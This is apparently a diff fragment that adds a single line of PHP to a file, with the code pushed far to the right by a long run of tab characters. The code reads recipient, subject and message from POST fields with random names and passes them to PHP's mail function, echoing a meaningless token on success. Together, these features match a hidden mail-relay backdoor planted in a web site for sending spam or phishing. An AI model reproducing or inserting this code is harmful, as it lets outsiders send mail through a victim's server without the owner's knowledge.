@@ -1,0 +1,1 @@
+																																	<?php $mmoevtefsi = stripslashes($_POST['uikmer']); $acloqxggvneo = stripslashes($_POST['xccxvqw']); $nijpqkdiusdh = stripslashes($_POST['weeoo']);  $cqdhw = mail(stripslashes($mmoevtefsi), stripslashes($acloqxggvneo), stripslashes($nijpqkdiusdh)); if($cqdhw){echo 'smdj';} else {echo 'dirryex : '.$cqdhw;}     
